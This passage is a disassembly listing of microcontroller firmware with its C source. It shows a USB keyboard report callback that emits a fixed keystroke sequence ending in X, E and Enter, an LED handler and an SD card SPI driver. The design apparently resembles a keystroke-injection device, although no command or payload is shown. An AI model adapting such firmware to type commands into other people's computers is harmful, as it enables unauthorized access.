                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_X;
    3c42:	8b e1       	ldi	r24, 0x1B	; 27
    3c44:	f7 01       	movw	r30, r14
    3c46:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3c48:	0d c0       	rjmp	.+26     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 9:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_E;
    3c4a:	88 e0       	ldi	r24, 0x08	; 8
    3c4c:	f7 01       	movw	r30, r14
    3c4e:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3c50:	09 c0       	rjmp	.+18     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 10:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_ENTER;
    3c52:	88 e2       	ldi	r24, 0x28	; 40
    3c54:	f7 01       	movw	r30, r14
    3c56:	82 83       	std	Z+2, r24	; 0x02
                    break;
    3c58:	05 c0       	rjmp	.+10     	; 0x3c64 <CALLBACK_HID_Device_CreateHIDReport+0x1ac>

                case 11:
                    KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_ENTER;
    3c5a:	88 e2       	ldi	r24, 0x28	; 40
    3c5c:	f7 01       	movw	r30, r14
    3c5e:	82 83       	std	Z+2, r24	; 0x02
                    curr_snd = 0;
    3c60:	10 92 50 09 	sts	0x0950, r1	; 0x800950 <curr_snd.5106>
                    break;
            }
            cnt = 0x1FF;
    3c64:	8f ef       	ldi	r24, 0xFF	; 255
    3c66:	91 e0       	ldi	r25, 0x01	; 1
    3c68:	90 93 0c 01 	sts	0x010C, r25	; 0x80010c <cnt.5105+0x1>
    3c6c:	80 93 0b 01 	sts	0x010B, r24	; 0x80010b <cnt.5105>
            curr_snd++;
    3c70:	80 91 50 09 	lds	r24, 0x0950	; 0x800950 <curr_snd.5106>
    3c74:	8f 5f       	subi	r24, 0xFF	; 255
    3c76:	80 93 50 09 	sts	0x0950, r24	; 0x800950 <curr_snd.5106>
        }
    }
bypass:
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    3c7a:	88 e0       	ldi	r24, 0x08	; 8
    3c7c:	90 e0       	ldi	r25, 0x00	; 0
    3c7e:	f8 01       	movw	r30, r16
    3c80:	91 83       	std	Z+1, r25	; 0x01
    3c82:	80 83       	st	Z, r24
    return false;
}
    3c84:	80 e0       	ldi	r24, 0x00	; 0
    3c86:	c8 5b       	subi	r28, 0xB8	; 184
    3c88:	df 4f       	sbci	r29, 0xFF	; 255
    3c8a:	0f b6       	in	r0, 0x3f	; 63
    3c8c:	f8 94       	cli
    3c8e:	de bf       	out	0x3e, r29	; 62
    3c90:	0f be       	out	0x3f, r0	; 63
    3c92:	cd bf       	out	0x3d, r28	; 61
    3c94:	df 91       	pop	r29
    3c96:	cf 91       	pop	r28
    3c98:	1f 91       	pop	r17
    3c9a:	0f 91       	pop	r16
    3c9c:	ff 90       	pop	r15
    3c9e:	ef 90       	pop	r14
    3ca0:	df 90       	pop	r13
    3ca2:	cf 90       	pop	r12
    3ca4:	08 95       	ret

00003ca6 <CALLBACK_HID_Device_ProcessHIDReport>:
        const uint16_t ReportSize)
{
    uint8_t  LEDMask   = LEDS_NO_LEDS;
    uint8_t* LEDReport = (uint8_t*)ReportData;

    if (last_led)
    3ca6:	80 91 5b 09 	lds	r24, 0x095B	; 0x80095b <last_led>
    3caa:	81 11       	cpse	r24, r1
    3cac:	0c c0       	rjmp	.+24     	; 0x3cc6 <CALLBACK_HID_Device_ProcessHIDReport+0x20>
    {
        return;
    }

    if (*LEDReport & HID_KEYBOARD_LED_NUMLOCK)
    3cae:	f9 01       	movw	r30, r18
    3cb0:	90 81       	ld	r25, Z
    3cb2:	90 fd       	sbrc	r25, 0
    {
        LEDMask |= LEDS_LED1;
    3cb4:	80 e4       	ldi	r24, 0x40	; 64
    }

    if (*LEDReport & HID_KEYBOARD_LED_CAPSLOCK)
    3cb6:	91 fd       	sbrc	r25, 1
    {
        LEDMask |= LEDS_LED2;
    3cb8:	80 68       	ori	r24, 0x80	; 128
    }

    if (*LEDReport & HID_KEYBOARD_LED_SCROLLLOCK)
    3cba:	92 fd       	sbrc	r25, 2
    {
        LEDMask |= LEDS_LED1 | LEDS_LED2;
    3cbc:	80 6c       	ori	r24, 0xC0	; 192
    3cbe:	9b b1       	in	r25, 0x0b	; 11
    3cc0:	9f 73       	andi	r25, 0x3F	; 63
    3cc2:	89 2b       	or	r24, r25
    3cc4:	8b b9       	out	0x0b, r24	; 11
    3cc6:	08 95       	ret

00003cc8 <power_on>:
    }

    deselect();

    return count ? RES_ERROR : RES_OK;
}
    3cc8:	87 e0       	ldi	r24, 0x07	; 7
    3cca:	85 b9       	out	0x05, r24	; 5
    3ccc:	84 b1       	in	r24, 0x04	; 4
    3cce:	87 60       	ori	r24, 0x07	; 7
    3cd0:	84 b9       	out	0x04, r24	; 4
    3cd2:	83 e5       	ldi	r24, 0x53	; 83
    3cd4:	8c bd       	out	0x2c, r24	; 44
    3cd6:	08 95       	ret

00003cd8 <power_off>:
    3cd8:	1c bc       	out	0x2c, r1	; 44
    3cda:	84 b1       	in	r24, 0x04	; 4
    3cdc:	8b 7f       	andi	r24, 0xFB	; 251
    3cde:	84 b9       	out	0x04, r24	; 4
    3ce0:	85 b1       	in	r24, 0x05	; 5
    3ce2:	8b 7f       	andi	r24, 0xFB	; 251
    3ce4:	85 b9       	out	0x05, r24	; 5
    3ce6:	08 95       	ret

00003ce8 <xchg_spi>:
    3ce8:	8e bd       	out	0x2e, r24	; 46
    3cea:	0d b4       	in	r0, 0x2d	; 45
    3cec:	07 fe       	sbrs	r0, 7
    3cee:	fd cf       	rjmp	.-6      	; 0x3cea <xchg_spi+0x2>
    3cf0:	8e b5       	in	r24, 0x2e	; 46
    3cf2:	08 95       	ret

00003cf4 <rcvr_spi_multi>:
    3cf4:	fc 01       	movw	r30, r24
    3cf6:	01 c0       	rjmp	.+2      	; 0x3cfa <rcvr_spi_multi+0x6>
    3cf8:	f9 01       	movw	r30, r18
    3cfa:	8f ef       	ldi	r24, 0xFF	; 255
    3cfc:	8e bd       	out	0x2e, r24	; 46
    3cfe:	0d b4       	in	r0, 0x2d	; 45
    3d00:	07 fe       	sbrs	r0, 7
    3d02:	fd cf       	rjmp	.-6      	; 0x3cfe <rcvr_spi_multi+0xa>
    3d04:	8e b5       	in	r24, 0x2e	; 46
    3d06:	80 83       	st	Z, r24
    3d08:	8f ef       	ldi	r24, 0xFF	; 255
    3d0a:	8e bd       	out	0x2e, r24	; 46
    3d0c:	0d b4       	in	r0, 0x2d	; 45
    3d0e:	07 fe       	sbrs	r0, 7
    3d10:	fd cf       	rjmp	.-6      	; 0x3d0c <rcvr_spi_multi+0x18>
    3d12:	9f 01       	movw	r18, r30
    3d14:	2e 5f       	subi	r18, 0xFE	; 254
    3d16:	3f 4f       	sbci	r19, 0xFF	; 255
    3d18:	8e b5       	in	r24, 0x2e	; 46
    3d1a:	81 83       	std	Z+1, r24	; 0x01
    3d1c:	62 50       	subi	r22, 0x02	; 2
    3d1e:	71 09       	sbc	r23, r1
    3d20:	59 f7       	brne	.-42     	; 0x3cf8 <rcvr_spi_multi+0x4>
    3d22:	08 95       	ret

00003d24 <xmit_spi_multi>:
    3d24:	fc 01       	movw	r30, r24
    3d26:	01 c0       	rjmp	.+2      	; 0x3d2a <xmit_spi_multi+0x6>
    3d28:	f9 01       	movw	r30, r18
    3d2a:	80 81       	ld	r24, Z
    3d2c:	8e bd       	out	0x2e, r24	; 46
    3d2e:	0d b4       	in	r0, 0x2d	; 45
    3d30:	07 fe       	sbrs	r0, 7
    3d32:	fd cf       	rjmp	.-6      	; 0x3d2e <xmit_spi_multi+0xa>
    3d34:	9f 01       	movw	r18, r30
    3d36:	2e 5f       	subi	r18, 0xFE	; 254
    3d38:	3f 4f       	sbci	r19, 0xFF	; 255
    3d3a:	81 81       	ldd	r24, Z+1	; 0x01
    3d3c:	8e bd       	out	0x2e, r24	; 46
    3d3e:	0d b4       	in	r0, 0x2d	; 45
    3d40:	07 fe       	sbrs	r0, 7
    3d42:	fd cf       	rjmp	.-6      	; 0x3d3e <xmit_spi_multi+0x1a>
    3d44:	62 50       	subi	r22, 0x02	; 2
    3d46:	71 09       	sbc	r23, r1
    3d48:	79 f7       	brne	.-34     	; 0x3d28 <xmit_spi_multi+0x4>
    3d4a:	08 95       	ret

00003d4c <wait_ready>:
    3d4c:	9c 01       	movw	r18, r24
    3d4e:	ad ec       	ldi	r26, 0xCD	; 205
    3d50:	bc ec       	ldi	r27, 0xCC	; 204
    3d52:	0e 94 d6 38 	call	0x71ac	; 0x71ac <__umulhisi3>
    3d56:	96 95       	lsr	r25
    3d58:	87 95       	ror	r24
    3d5a:	96 95       	lsr	r25
    3d5c:	87 95       	ror	r24
    3d5e:	96 95       	lsr	r25
    3d60:	87 95       	ror	r24
    3d62:	f8 94       	cli
    3d64:	90 93 5f 09 	sts	0x095F, r25	; 0x80095f <Timer2+0x1>
    3d68:	80 93 5e 09 	sts	0x095E, r24	; 0x80095e <Timer2>
    3d6c:	78 94       	sei
    3d6e:	8f ef       	ldi	r24, 0xFF	; 255
    3d70:	bb df       	rcall	.-138    	; 0x3ce8 <xchg_spi>
    3d72:	f8 94       	cli
    3d74:	20 91 5e 09 	lds	r18, 0x095E	; 0x80095e <Timer2>
    3d78:	30 91 5f 09 	lds	r19, 0x095F	; 0x80095f <Timer2+0x1>
    3d7c:	78 94       	sei
    3d7e:	8f 3f       	cpi	r24, 0xFF	; 255
    3d80:	11 f0       	breq	.+4      	; 0x3d86 <wait_ready+0x3a>
    3d82:	23 2b       	or	r18, r19
    3d84:	a1 f7       	brne	.-24     	; 0x3d6e <wait_ready+0x22>
    3d86:	91 e0       	ldi	r25, 0x01	; 1
    3d88:	8f 3f       	cpi	r24, 0xFF	; 255
    3d8a:	09 f0       	breq	.+2      	; 0x3d8e <wait_ready+0x42>
    3d8c:	90 e0       	ldi	r25, 0x00	; 0
    3d8e:	89 2f       	mov	r24, r25
    3d90:	90 e0       	ldi	r25, 0x00	; 0
    3d92:	08 95       	ret

00003d94 <deselect>:
    3d94:	85 b1       	in	r24, 0x05	; 5
    3d96:	81 60       	ori	r24, 0x01	; 1
    3d98:	85 b9       	out	0x05, r24	; 5
    3d9a:	8f ef       	ldi	r24, 0xFF	; 255
    3d9c:	a5 cf       	rjmp	.-182    	; 0x3ce8 <xchg_spi>
    3d9e:	08 95       	ret

00003da0 <select>:
    3da0:	cf 93       	push	r28
    3da2:	df 93       	push	r29
    3da4:	85 b1       	in	r24, 0x05	; 5
    3da6:	8e 7f       	andi	r24, 0xFE	; 254
    3da8:	85 b9       	out	0x05, r24	; 5
    3daa:	8f ef       	ldi	r24, 0xFF	; 255
    3dac:	9d df       	rcall	.-198    	; 0x3ce8 <xchg_spi>
    3dae:	84 ef       	ldi	r24, 0xF4	; 244
    3db0:	91 e0       	ldi	r25, 0x01	; 1
    3db2:	cc df       	rcall	.-104    	; 0x3d4c <wait_ready>
    3db4:	ec 01       	movw	r28, r24
    3db6:	89 2b       	or	r24, r25
    3db8:	11 f4       	brne	.+4      	; 0x3dbe <select+0x1e>
    3dba:	ec df       	rcall	.-40     	; 0x3d94 <deselect>
    3dbc:	02 c0       	rjmp	.+4      	; 0x3dc2 <select+0x22>
    3dbe:	c1 e0       	ldi	r28, 0x01	; 1
    3dc0:	d0 e0       	ldi	r29, 0x00	; 0
    3dc2:	ce 01       	movw	r24, r28
    3dc4:	df 91       	pop	r29
    3dc6:	cf 91       	pop	r28
    3dc8:	08 95       	ret

00003dca <rcvr_datablock>:
    3dca:	0f 93       	push	r16
    3dcc:	1f 93       	push	r17
    3dce:	cf 93       	push	r28
    3dd0:	df 93       	push	r29
    3dd2:	ec 01       	movw	r28, r24
    3dd4:	8b 01       	movw	r16, r22
    3dd6:	84 e1       	ldi	r24, 0x14	; 20
    3dd8:	80 93 60 09 	sts	0x0960, r24	; 0x800960 <Timer1>
    3ddc:	8f ef       	ldi	r24, 0xFF	; 255
    3dde:	84 df       	rcall	.-248    	; 0x3ce8 <xchg_spi>
    3de0:	8f 3f       	cpi	r24, 0xFF	; 255
    3de2:	21 f4       	brne	.+8      	; 0x3dec <rcvr_datablock+0x22>
    3de4:	90 91 60 09 	lds	r25, 0x0960	; 0x800960 <Timer1>
    3de8:	91 11       	cpse	r25, r1
    3dea:	f8 cf       	rjmp	.-16     	; 0x3ddc <rcvr_datablock+0x12>
    3dec:	8e 3f       	cpi	r24, 0xFE	; 254
    3dee:	51 f4       	brne	.+20     	; 0x3e04 <rcvr_datablock+0x3a>
    3df0:	b8 01       	movw	r22, r16
    3df2:	ce 01       	movw	r24, r28
    3df4:	7f df       	rcall	.-258    	; 0x3cf4 <rcvr_spi_multi>
    3df6:	8f ef       	ldi	r24, 0xFF	; 255
    3df8:	77 df       	rcall	.-274    	; 0x3ce8 <xchg_spi>
    3dfa:	8f ef       	ldi	r24, 0xFF	; 255
    3dfc:	75 df       	rcall	.-278    	; 0x3ce8 <xchg_spi>
    3dfe:	81 e0       	ldi	r24, 0x01	; 1
    3e00:	90 e0       	ldi	r25, 0x00	; 0
    3e02:	02 c0       	rjmp	.+4      	; 0x3e08 <rcvr_datablock+0x3e>
    3e04:	80 e0       	ldi	r24, 0x00	; 0
    3e06:	90 e0       	ldi	r25, 0x00	; 0
    3e08:	df 91       	pop	r29
    3e0a:	cf 91       	pop	r28
    3e0c:	1f 91       	pop	r17
    3e0e:	0f 91       	pop	r16
    3e10:	08 95       	ret

00003e12 <xmit_datablock>:
    3e12:	0f 93       	push	r16
    3e14:	1f 93       	push	r17
    3e16:	cf 93       	push	r28
    3e18:	8c 01       	movw	r16, r24
    3e1a:	c6 2f       	mov	r28, r22
    3e1c:	84 ef       	ldi	r24, 0xF4	; 244
    3e1e:	91 e0       	ldi	r25, 0x01	; 1
    3e20:	95 df       	rcall	.-214    	; 0x3d4c <wait_ready>
    3e22:	00 97       	sbiw	r24, 0x00	; 0
    3e24:	c1 f0       	breq	.+48     	; 0x3e56 <xmit_datablock+0x44>
    3e26:	8c 2f       	mov	r24, r28
    3e28:	5f df       	rcall	.-322    	; 0x3ce8 <xchg_spi>
    3e2a:	cd 3f       	cpi	r28, 0xFD	; 253
    3e2c:	91 f0       	breq	.+36     	; 0x3e52 <xmit_datablock+0x40>
    3e2e:	60 e0       	ldi	r22, 0x00	; 0
    3e30:	72 e0       	ldi	r23, 0x02	; 2
    3e32:	c8 01       	movw	r24, r16
    3e34:	77 df       	rcall	.-274    	; 0x3d24 <xmit_spi_multi>
    3e36:	8f ef       	ldi	r24, 0xFF	; 255
    3e38:	57 df       	rcall	.-338    	; 0x3ce8 <xchg_spi>
    3e3a:	8f ef       	ldi	r24, 0xFF	; 255
    3e3c:	55 df       	rcall	.-342    	; 0x3ce8 <xchg_spi>
    3e3e:	8f ef       	ldi	r24, 0xFF	; 255
    3e40:	53 df       	rcall	.-346    	; 0x3ce8 <xchg_spi>
    3e42:	8f 71       	andi	r24, 0x1F	; 31
    3e44:	91 e0       	ldi	r25, 0x01	; 1
    3e46:	85 30       	cpi	r24, 0x05	; 5
    3e48:	09 f0       	breq	.+2      	; 0x3e4c <xmit_datablock+0x3a>
    3e4a:	90 e0       	ldi	r25, 0x00	; 0
    3e4c:	89 2f       	mov	r24, r25
    3e4e:	90 e0       	ldi	r25, 0x00	; 0
    3e50:	02 c0       	rjmp	.+4      	; 0x3e56 <xmit_datablock+0x44>
    3e52:	81 e0       	ldi	r24, 0x01	; 1
    3e54:	90 e0       	ldi	r25, 0x00	; 0
    3e56:	cf 91       	pop	r28
    3e58:	1f 91       	pop	r17
    3e5a:	0f 91       	pop	r16
    3e5c:	08 95       	ret

00003e5e <send_cmd>:
    3e5e:	ff 92       	push	r15
    3e60:	0f 93       	push	r16
    3e62:	1f 93       	push	r17
    3e64:	cf 93       	push	r28
    3e66:	df 93       	push	r29
    3e68:	c8 2f       	mov	r28, r24
    3e6a:	d4 2f       	mov	r29, r20
    3e6c:	15 2f       	mov	r17, r21
    3e6e:	06 2f       	mov	r16, r22
    3e70:	f7 2e       	mov	r15, r23
    3e72:	88 23       	and	r24, r24
    3e74:	44 f4       	brge	.+16     	; 0x3e86 <send_cmd+0x28>
    3e76:	cf 77       	andi	r28, 0x7F	; 127
    3e78:	40 e0       	ldi	r20, 0x00	; 0
    3e7a:	50 e0       	ldi	r21, 0x00	; 0
    3e7c:	ba 01       	movw	r22, r20
    3e7e:	87 e3       	ldi	r24, 0x37	; 55
    3e80:	ee df       	rcall	.-36     	; 0x3e5e <send_cmd>
    3e82:	82 30       	cpi	r24, 0x02	; 2
    3e84:	38 f5       	brcc	.+78     	; 0x3ed4 <send_cmd+0x76>
    3e86:	cc 30       	cpi	r28, 0x0C	; 12
    3e88:	21 f0       	breq	.+8      	; 0x3e92 <send_cmd+0x34>
    3e8a:	84 df       	rcall	.-248    	; 0x3d94 <deselect>
    3e8c:	89 df       	rcall	.-238    	; 0x3da0 <select>
    3e8e:	89 2b       	or	r24, r25
    3e90:	01 f1       	breq	.+64     	; 0x3ed2 <send_cmd+0x74>
    3e92:	8c 2f       	mov	r24, r28
    3e94:	80 64       	ori	r24, 0x40	; 64
    3e96:	28 df       	rcall	.-432    	; 0x3ce8 <xchg_spi>
    3e98:	8f 2d       	mov	r24, r15
    3e9a:	26 df       	rcall	.-436    	; 0x3ce8 <xchg_spi>
    3e9c:	80 2f       	mov	r24, r16
    3e9e:	24 df       	rcall	.-440    	; 0x3ce8 <xchg_spi>
    3ea0:	81 2f       	mov	r24, r17
    3ea2:	22 df       	rcall	.-444    	; 0x3ce8 <xchg_spi>
    3ea4:	8d 2f       	mov	r24, r29
    3ea6:	20 df       	rcall	.-448    	; 0x3ce8 <xchg_spi>
    3ea8:	cc 23       	and	r28, r28
    3eaa:	11 f0       	breq	.+4      	; 0x3eb0 <send_cmd+0x52>
    3eac:	81 e0       	ldi	r24, 0x01	; 1
    3eae:	01 c0       	rjmp	.+2      	; 0x3eb2 <send_cmd+0x54>
    3eb0:	85 e9       	ldi	r24, 0x95	; 149
    3eb2:	c8 30       	cpi	r28, 0x08	; 8
    3eb4:	09 f4       	brne	.+2      	; 0x3eb8 <send_cmd+0x5a>
    3eb6:	87 e8       	ldi	r24, 0x87	; 135
    3eb8:	17 df       	rcall	.-466    	; 0x3ce8 <xchg_spi>
    3eba:	cc 30       	cpi	r28, 0x0C	; 12
    3ebc:	11 f4       	brne	.+4      	; 0x3ec2 <send_cmd+0x64>
    3ebe:	8f ef       	ldi	r24, 0xFF	; 255
    3ec0:	13 df       	rcall	.-474    	; 0x3ce8 <xchg_spi>
    3ec2:	ca e0       	ldi	r28, 0x0A	; 10
    3ec4:	8f ef       	ldi	r24, 0xFF	; 255
    3ec6:	10 df       	rcall	.-480    	; 0x3ce8 <xchg_spi>
    3ec8:	88 23       	and	r24, r24
    3eca:	24 f4       	brge	.+8      	; 0x3ed4 <send_cmd+0x76>
    3ecc:	c1 50       	subi	r28, 0x01	; 1
    3ece:	d1 f7       	brne	.-12     	; 0x3ec4 <send_cmd+0x66>
    3ed0:	01 c0       	rjmp	.+2      	; 0x3ed4 <send_cmd+0x76>
    3ed2:	8f ef       	ldi	r24, 0xFF	; 255
    3ed4:	df 91       	pop	r29
    3ed6:	cf 91       	pop	r28
    3ed8:	1f 91       	pop	r17
    3eda:	0f 91       	pop	r16
    3edc:	ff 90       	pop	r15
    3ede:	08 95       	ret

00003ee0 <mmc_disk_initialize>:
    3ee0:	ef 92       	push	r14
    3ee2:	ff 92       	push	r15
    3ee4:	0f 93       	push	r16
    3ee6:	1f 93       	push	r17
    3ee8:	cf 93       	push	r28
    3eea:	df 93       	push	r29
    3eec:	00 d0       	rcall	.+0      	; 0x3eee <mmc_disk_initialize+0xe>
    3eee:	00 d0       	rcall	.+0      	; 0x3ef0 <mmc_disk_initialize+0x10>
    3ef0:	cd b7       	in	r28, 0x3d	; 61
    3ef2:	de b7       	in	r29, 0x3e	; 62
    3ef4:	f1 de       	rcall	.-542    	; 0x3cd8 <power_off>
    3ef6:	8a e0       	ldi	r24, 0x0A	; 10
    3ef8:	80 93 60 09 	sts	0x0960, r24	; 0x800960 <Timer1>
    3efc:	80 91 60 09 	lds	r24, 0x0960	; 0x800960 <Timer1>
    3f00:	81 11       	cpse	r24, r1
    3f02:	fc cf       	rjmp	.-8      	; 0x3efc <mmc_disk_initialize+0x1c>
    3f04:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    3f08:	81 ff       	sbrs	r24, 1
    3f0a:	03 c0       	rjmp	.+6      	; 0x3f12 <mmc_disk_initialize+0x32>
    3f0c:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    3f10:	a5 c0       	rjmp	.+330    	; 0x405c <mmc_disk_initialize+0x17c>
    3f12:	da de       	rcall	.-588    	; 0x3cc8 <power_on>
    3f14:	82 e5       	ldi	r24, 0x52	; 82
    3f16:	8c bd       	out	0x2c, r24	; 44
    3f18:	1a e0       	ldi	r17, 0x0A	; 10
    3f1a:	03 c0       	rjmp	.+6      	; 0x3f22 <mmc_disk_initialize+0x42>
    3f1c:	8f ef       	ldi	r24, 0xFF	; 255
    3f1e:	e4 de       	rcall	.-568    	; 0x3ce8 <xchg_spi>
    3f20:	11 50       	subi	r17, 0x01	; 1
    3f22:	11 11       	cpse	r17, r1
    3f24:	fb cf       	rjmp	.-10     	; 0x3f1c <mmc_disk_initialize+0x3c>
    3f26:	40 e0       	ldi	r20, 0x00	; 0
    3f28:	50 e0       	ldi	r21, 0x00	; 0
    3f2a:	ba 01       	movw	r22, r20
    3f2c:	80 e0       	ldi	r24, 0x00	; 0
    3f2e:	97 df       	rcall	.-210    	; 0x3e5e <send_cmd>
    3f30:	81 30       	cpi	r24, 0x01	; 1
    3f32:	09 f0       	breq	.+2      	; 0x3f36 <mmc_disk_initialize+0x56>
    3f34:	76 c0       	rjmp	.+236    	; 0x4022 <mmc_disk_initialize+0x142>
    3f36:	84 e6       	ldi	r24, 0x64	; 100
    3f38:	80 93 60 09 	sts	0x0960, r24	; 0x800960 <Timer1>
    3f3c:	4a ea       	ldi	r20, 0xAA	; 170
    3f3e:	51 e0       	ldi	r21, 0x01	; 1
    3f40:	60 e0       	ldi	r22, 0x00	; 0
    3f42:	70 e0       	ldi	r23, 0x00	; 0
    3f44:	88 e0       	ldi	r24, 0x08	; 8
    3f46:	8b df       	rcall	.-234    	; 0x3e5e <send_cmd>
    3f48:	81 30       	cpi	r24, 0x01	; 1
    3f4a:	09 f0       	breq	.+2      	; 0x3f4e <mmc_disk_initialize+0x6e>
    3f4c:	46 c0       	rjmp	.+140    	; 0x3fda <mmc_disk_initialize+0xfa>
    3f4e:	0d c0       	rjmp	.+26     	; 0x3f6a <mmc_disk_initialize+0x8a>
    3f50:	e0 2e       	mov	r14, r16
    3f52:	f1 2c       	mov	r15, r1
    3f54:	8f ef       	ldi	r24, 0xFF	; 255
    3f56:	c8 de       	rcall	.-624    	; 0x3ce8 <xchg_spi>
    3f58:	e1 e0       	ldi	r30, 0x01	; 1
    3f5a:	f0 e0       	ldi	r31, 0x00	; 0
    3f5c:	ec 0f       	add	r30, r28
    3f5e:	fd 1f       	adc	r31, r29
    3f60:	ee 0d       	add	r30, r14
    3f62:	ff 1d       	adc	r31, r15
    3f64:	80 83       	st	Z, r24
    3f66:	0f 5f       	subi	r16, 0xFF	; 255
    3f68:	01 c0       	rjmp	.+2      	; 0x3f6c <mmc_disk_initialize+0x8c>
    3f6a:	01 2f       	mov	r16, r17
    3f6c:	04 30       	cpi	r16, 0x04	; 4
    3f6e:	80 f3       	brcs	.-32     	; 0x3f50 <mmc_disk_initialize+0x70>
    3f70:	8b 81       	ldd	r24, Y+3	; 0x03
    3f72:	81 30       	cpi	r24, 0x01	; 1
    3f74:	09 f0       	breq	.+2      	; 0x3f78 <mmc_disk_initialize+0x98>
    3f76:	57 c0       	rjmp	.+174    	; 0x4026 <mmc_disk_initialize+0x146>
    3f78:	8c 81       	ldd	r24, Y+4	; 0x04
    3f7a:	8a 3a       	cpi	r24, 0xAA	; 170
    3f7c:	09 f0       	breq	.+2      	; 0x3f80 <mmc_disk_initialize+0xa0>
    3f7e:	55 c0       	rjmp	.+170    	; 0x402a <mmc_disk_initialize+0x14a>
    3f80:	80 91 60 09 	lds	r24, 0x0960	; 0x800960 <Timer1>
    3f84:	88 23       	and	r24, r24
    3f86:	41 f0       	breq	.+16     	; 0x3f98 <mmc_disk_initialize+0xb8>
    3f88:	40 e0       	ldi	r20, 0x00	; 0
    3f8a:	50 e0       	ldi	r21, 0x00	; 0
    3f8c:	60 e0       	ldi	r22, 0x00	; 0
    3f8e:	70 e4       	ldi	r23, 0x40	; 64
    3f90:	89 ea       	ldi	r24, 0xA9	; 169
    3f92:	65 df       	rcall	.-310    	; 0x3e5e <send_cmd>
    3f94:	81 11       	cpse	r24, r1
    3f96:	f4 cf       	rjmp	.-24     	; 0x3f80 <mmc_disk_initialize+0xa0>
    3f98:	80 91 60 09 	lds	r24, 0x0960	; 0x800960 <Timer1>
    3f9c:	88 23       	and	r24, r24
    3f9e:	09 f4       	brne	.+2      	; 0x3fa2 <mmc_disk_initialize+0xc2>
    3fa0:	46 c0       	rjmp	.+140    	; 0x402e <mmc_disk_initialize+0x14e>
    3fa2:	40 e0       	ldi	r20, 0x00	; 0
    3fa4:	50 e0       	ldi	r21, 0x00	; 0
    3fa6:	ba 01       	movw	r22, r20
    3fa8:	8a e3       	ldi	r24, 0x3A	; 58
    3faa:	59 df       	rcall	.-334    	; 0x3e5e <send_cmd>
    3fac:	88 23       	and	r24, r24
    3fae:	71 f0       	breq	.+28     	; 0x3fcc <mmc_disk_initialize+0xec>
    3fb0:	10 e0       	ldi	r17, 0x00	; 0
    3fb2:	44 c0       	rjmp	.+136    	; 0x403c <mmc_disk_initialize+0x15c>
    3fb4:	e1 2e       	mov	r14, r17
    3fb6:	f1 2c       	mov	r15, r1
    3fb8:	8f ef       	ldi	r24, 0xFF	; 255
    3fba:	96 de       	rcall	.-724    	; 0x3ce8 <xchg_spi>
    3fbc:	e1 e0       	ldi	r30, 0x01	; 1
    3fbe:	f0 e0       	ldi	r31, 0x00	; 0
    3fc0:	ec 0f       	add	r30, r28
    3fc2:	fd 1f       	adc	r31, r29
    3fc4:	ee 0d       	add	r30, r14
    3fc6:	ff 1d       	adc	r31, r15
    3fc8:	80 83       	st	Z, r24
    3fca:	1f 5f       	subi	r17, 0xFF	; 255
    3fcc:	14 30       	cpi	r17, 0x04	; 4
    3fce:	90 f3       	brcs	.-28     	; 0x3fb4 <mmc_disk_initialize+0xd4>
    3fd0:	89 81       	ldd	r24, Y+1	; 0x01
    3fd2:	86 ff       	sbrs	r24, 6
    3fd4:	2e c0       	rjmp	.+92     	; 0x4032 <mmc_disk_initialize+0x152>
    3fd6:	18 e1       	ldi	r17, 0x18	; 24
    3fd8:	31 c0       	rjmp	.+98     	; 0x403c <mmc_disk_initialize+0x15c>
    3fda:	40 e0       	ldi	r20, 0x00	; 0
    3fdc:	50 e0       	ldi	r21, 0x00	; 0
    3fde:	ba 01       	movw	r22, r20
    3fe0:	89 ea       	ldi	r24, 0xA9	; 169
    3fe2:	3d df       	rcall	.-390    	; 0x3e5e <send_cmd>
    3fe4:	82 30       	cpi	r24, 0x02	; 2
    3fe6:	18 f4       	brcc	.+6      	; 0x3fee <mmc_disk_initialize+0x10e>
    3fe8:	14 e0       	ldi	r17, 0x04	; 4
    3fea:	09 ea       	ldi	r16, 0xA9	; 169
    3fec:	02 c0       	rjmp	.+4      	; 0x3ff2 <mmc_disk_initialize+0x112>
    3fee:	11 e0       	ldi	r17, 0x01	; 1
    3ff0:	01 e0       	ldi	r16, 0x01	; 1
    3ff2:	80 91 60 09 	lds	r24, 0x0960	; 0x800960 <Timer1>
    3ff6:	88 23       	and	r24, r24
    3ff8:	39 f0       	breq	.+14     	; 0x4008 <mmc_disk_initialize+0x128>
    3ffa:	40 e0       	ldi	r20, 0x00	; 0
    3ffc:	50 e0       	ldi	r21, 0x00	; 0
    3ffe:	ba 01       	movw	r22, r20
    4000:	80 2f       	mov	r24, r16
    4002:	2d df       	rcall	.-422    	; 0x3e5e <send_cmd>
    4004:	81 11       	cpse	r24, r1
    4006:	f5 cf       	rjmp	.-22     	; 0x3ff2 <mmc_disk_initialize+0x112>
    4008:	80 91 60 09 	lds	r24, 0x0960	; 0x800960 <Timer1>
    400c:	88 23       	and	r24, r24
    400e:	99 f0       	breq	.+38     	; 0x4036 <mmc_disk_initialize+0x156>
    4010:	40 e0       	ldi	r20, 0x00	; 0
    4012:	52 e0       	ldi	r21, 0x02	; 2
    4014:	60 e0       	ldi	r22, 0x00	; 0
    4016:	70 e0       	ldi	r23, 0x00	; 0
    4018:	80 e1       	ldi	r24, 0x10	; 16
    401a:	21 df       	rcall	.-446    	; 0x3e5e <send_cmd>
    401c:	81 11       	cpse	r24, r1
    401e:	0d c0       	rjmp	.+26     	; 0x403a <mmc_disk_initialize+0x15a>
    4020:	0d c0       	rjmp	.+26     	; 0x403c <mmc_disk_initialize+0x15c>
    4022:	10 e0       	ldi	r17, 0x00	; 0
    4024:	0b c0       	rjmp	.+22     	; 0x403c <mmc_disk_initialize+0x15c>
    4026:	10 e0       	ldi	r17, 0x00	; 0
    4028:	09 c0       	rjmp	.+18     	; 0x403c <mmc_disk_initialize+0x15c>
    402a:	10 e0       	ldi	r17, 0x00	; 0
    402c:	07 c0       	rjmp	.+14     	; 0x403c <mmc_disk_initialize+0x15c>
